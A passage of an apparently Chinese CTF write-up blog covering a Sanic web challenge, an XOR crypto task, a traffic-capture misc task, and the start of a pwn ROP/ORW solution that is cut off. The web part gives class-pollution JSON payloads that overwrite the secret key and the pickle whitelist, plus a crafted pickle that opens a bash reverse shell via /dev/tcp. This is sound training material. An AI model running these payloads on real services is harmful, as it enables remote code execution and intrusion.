+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@token_required</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;GET&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">await</span> <span class="n">file_</span><span class="p">(</span><span class="s1">&#39;templates/upload.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;No file provided&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_object</span> <span class="o">=</span> <span class="n">file</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="nb">list</span><span class="p">)</span> <span class="k">else</span> <span class="n">file</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_data</span> <span class="o">=</span> <span class="n">restricted_loads</span><span class="p">(</span><span class="n">file_object</span><span class="o">.</span><span class="n">body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">my_object</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">new_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Pickle object loaded but not updated&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">pickle_file</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">my_object</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Pickle object updated&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">pickle</span><span class="o">.</span><span class="n">UnpicklingError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;Dangerous pickle file&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">await</span> <span class="n">file_</span><span class="p">(</span><span class="s1">&#39;templates/register.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">NewUser</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">,</span> <span class="s2">&#34;password&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">,</span> <span class="n">NewUser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">NewUser</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid request&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Register Success!&#34;</span><span class="p">,</span> <span class="s2">&#34;redirect&#34;</span><span class="p">:</span> <span class="s2">&#34;/login&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">await</span> <span class="n">file_</span><span class="p">(</span><span class="s1">&#39;templates/login.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;username&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;password&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Username or password missing&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="nb">next</span><span class="p">((</span><span class="n">u</span> <span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="n">users</span> <span class="k">if</span> <span class="n">u</span><span class="o">.</span><span class="n">username</span> <span class="o">==</span> <span class="n">username</span><span class="p">),</span> <span class="kc">None</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">password</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;user&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s2">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;guest&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">data</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span> <span class="o">+</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">5</span>
+</span></span><span class="line"><span class="cl">                <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">secret_key</span><span class="p">),</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;success&#34;</span><span class="p">,</span> <span class="s2">&#34;redirect&#34;</span><span class="p">:</span> <span class="s2">&#34;/upload&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s2">&#34;token&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl">                <span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Access-Control-Allow-Origin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;origin&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid password&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;User not found&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">404</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">json</span><span class="p">({</span><span class="s2">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;fail&#34;</span><span class="p">,</span> <span class="s2">&#34;message&#34;</span><span class="p">:</span> <span class="s2">&#34;Invalid request&#34;</span><span class="p">},</span> <span class="n">status</span><span class="o">=</span><span class="mi">400</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</span></span></code></pre></div><p>题目给了源码,</p>
+<ul>
+<li>存在merge,并且User类有<code>__init__</code>,一眼原型链污染,可以污染到<code>global</code>全局变量</li>
+<li>存在<code>RestrictedUnpickler</code>并重写了<code>find_class</code>,可以绕过来<code>pickle</code>反序列化</li>
+</ul>
+<p>​	所以这道题思路就是先利用原型链污染来污染<code>secret_key</code>伪造<code>admin</code>，再污染<code>safe_modules</code>和<code>safe_names</code>来绕过<code>RestrictedUnpickler</code>限制即可.</p>
+<p>源码中<code>/register</code>路由可以进行原型链污染</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021093950109-474360410.png" alt="image-20241019162312868"></p>
+<p>在<code>/upload</code>路由可以上传pkl文件来触发pickle反序列化.</p>
+<p>所以直接先传</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    &#34;__init__&#34;: {
+</span></span><span class="line"><span class="cl">        &#34;__globals__&#34;: {
+</span></span><span class="line"><span class="cl">            &#34;secret_key&#34;: &#34;123456&#34;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>污染<code>secret_key</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094025395-485307447.png" alt="image-20241019162519604"></p>
+<p>之后jwt伪造</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094030306-835463532.png" alt="image-20241019162618743"></p>
+<p>再污染</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;safe_names&#34;</span> <span class="p">:[</span><span class="s2">&#34;getattr&#34;</span><span class="p">,</span><span class="s2">&#34;system&#34;</span><span class="p">,</span><span class="s2">&#34;dict&#34;</span><span class="p">,</span><span class="s2">&#34;globals&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">和</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&#34;safe_modules&#34;</span> <span class="p">:</span> <span class="s2">&#34;builtins&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>之后根据<a href="https://goodapple.top/archives/1069">博客</a>里面绕过<code>builtins</code>的例子写<code>payload</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">getattr
+</span></span></span><span class="line"><span class="cl"><span class="s1">(cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">dict
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;get&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tR(cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">globals
+</span></span></span><span class="line"><span class="cl"><span class="s1">(tRS&#39;builtins&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tRp1
+</span></span></span><span class="line"><span class="cl"><span class="s1">cbuiltins
+</span></span></span><span class="line"><span class="cl"><span class="s1">getattr
+</span></span></span><span class="line"><span class="cl"><span class="s1">(g1
+</span></span></span><span class="line"><span class="cl"><span class="s1">S&#39;eval&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tR(S&#39;__import__(&#34;os&#34;).system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#39;&#34;)&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">tR.&#39;&#39;&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;dddd.pkl&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Type of &#39;data&#39;: </span><span class="si">{</span><span class="nb">type</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Module of &#39;data&#39;: </span><span class="si">{</span><span class="n">data</span><span class="o">.</span><span class="vm">__module__</span> <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s1">&#39;__module__&#39;</span><span class="p">)</span> <span class="k">else</span> <span class="s1">&#39;N/A&#39;</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>上传即可</p>
+<p>PS:这shell弹的太慢了,我还以为环境死了差点关了&hellip;.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094112459-1685459773.png" alt="image-20241019162930878"></p>
+<h1 id="crypto">
+<a class="header-anchor" href="#crypto"></a>
+Crypto
+</h1><h2 id="xor">
+<a class="header-anchor" href="#xor"></a>
+xor
+</h2><p>题目描述</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mimic is a keyword.
+</span></span><span class="line"><span class="cl">0b050c0e180e585f5c52555c5544545c0a0f44535f0f5e445658595844050f5d0f0f55590c555e5a0914
+</span></span></code></pre></div><p>直接给gpt，秒了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094135992-1445668991.png" alt="image-20241019163249407"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094156218-2020019155.png" alt="image-20241019163313547"></p>
+<h1 id="misc">
+<a class="header-anchor" href="#misc"></a>
+Misc
+</h1><h2 id="ezflag">
+<a class="header-anchor" href="#ezflag"></a>
+ezflag
+</h2><p>解压压缩包有个流量包,拿工具跑出来一个压缩包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094229732-112185337.png" alt="image-20241019163729644"></p>
+<p>解压后有个<code>flag.zip</code>，但是解压不出来，拿file看一下发现是一个png</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094425840-1389928001.png" alt="image-20241019163915023"></p>
+<p>之后改一下后缀即可得到flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241021094352731-1655859914.png" alt="image-20241019163906271"></p>
+<h1 id="pwn">
+<a class="header-anchor" href="#pwn"></a>
+pwn
+</h1><h2 id="signin-revenge">
+<a class="header-anchor" href="#signin-revenge"></a>
+signin revenge
+</h2><h3 id="题目libc环境">
+<a class="header-anchor" href="#%e9%a2%98%e7%9b%aelibc%e7%8e%af%e5%a2%83"></a>
+题目libc环境
+</h3><blockquote>
+<p>那道题目的时候，发现题目是直接跑不起来的。开始以为是沙箱的问题，还是太菜了。其实更换题目libc环境的问题</p>
+<p>这里跟换一下题目的libc环境，</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">patchelf --replace-needed  libc.so.6 ./libc.so.6 vuln
+</span></span><span class="line"><span class="cl">patchelf --set-interpreter  ./ld-linux-x86-64.so.2  vuln
+</span></span></code></pre></div><p>ldd vuln查看一下更换是否成功。</p>
+<p>然后就可以正常运行了。</p>
+<p>踩坑点：注意要把给定的libc文件进行授权。并且要在管理员模式下授权。</p>
+<p>这里注意不换也行，正常打远程应该不影响做题，但是复现跑本地就会遇到麻烦了。但是如果是你是kali的话。把他俩放在同一文件下kali会自行匹配ld文件和libc文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">bbq</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="err">桌面</span><span class="o">/</span><span class="err">啊布拉布拉</span><span class="o">/</span><span class="mi">11111</span><span class="err">$</span> <span class="n">ldd</span> <span class="n">vuln</span>
+</span></span><span class="line"><span class="cl">	<span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="mf">.1</span> <span class="p">(</span><span class="mh">0x00007fff6fb85000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span> <span class="p">(</span><span class="mh">0x00007fce115dc000</span><span class="p">)</span>    <span class="c1">//---------------------------------------------&gt;&gt;&gt;ld文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">.</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span> <span class="o">=&gt;</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span> <span class="p">(</span><span class="mh">0x00007fce117d0000</span><span class="p">)</span><span class="c1">//-------&gt;&gt;&gt;libc文件
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">bbq</span><span class="err">@</span><span class="nl">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="err">桌面</span><span class="o">/</span><span class="err">啊布拉布拉</span><span class="o">/</span><span class="mi">11111</span><span class="err">$</span> 
+</span></span></code></pre></div></blockquote>
+<p>先日常检查一下</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ checksec vuln
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/bbq/桌面/啊布拉布拉/11111/2222/vuln&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x3fe000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ 
+</span></span></code></pre></div><p>正常的NX和got表可写</p>
+<p>丢进ida里面看看</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sandbox</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;lets move and pwn!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">vuln</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ssize_t</span> <span class="nf">vuln</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-100h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x130uLL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>进去可以明显的看见一个沙箱函数和我们所要纯在漏洞的read函数</p>
+<p>简单看一下沙箱函数</p>
+<p>这里我问了一下gpt，其实大概我的理解就是提醒我们使用ORW</p>
+<h3 id="orw">
+<a class="header-anchor" href="#orw"></a>
+ORW
+</h3><p>首先通过<code>open函数</code>向<code>bss段上</code>中写入<code>b'./flag\x00\x00'</code>，并将<code>b'./flag\x00\x00'</code>作为<code>open函数</code>的参数，构造<code>open(b'./flag\x00\x00')</code>用来打开当前目录名为flag的文件，其中0表示只读方式打开。然后构造 <code>read(3, name_addr, 0x50)</code> 将 flag 内容写入到 <code>name</code> 的地址处，再通过构造 <code>write(1, name_addr, 0x50)</code> 将 flag 内容从 <code>name</code> 的地址处输出到终端。</p>
+<p>寄存器的偏移查找</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./libc.so.6 --only  <span class="s1">&#39;pop|ret&#39;</span>
+</span></span></code></pre></div><p>ROP链就是一个正常的泄露libc基址链</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="err">&#39;</span><span class="n">linux</span><span class="err">&#39;</span><span class="p">,</span><span class="n">arch</span><span class="o">=</span><span class="err">&#39;</span><span class="n">amd64</span><span class="err">&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="err">&#39;</span><span class="n">debug</span><span class="err">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="err">&#39;</span><span class="p">)</span>   
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="err">&#39;</span><span class="p">.</span><span class="o">/</span><span class="n">vuln</span><span class="err">&#39;</span><span class="p">)</span>
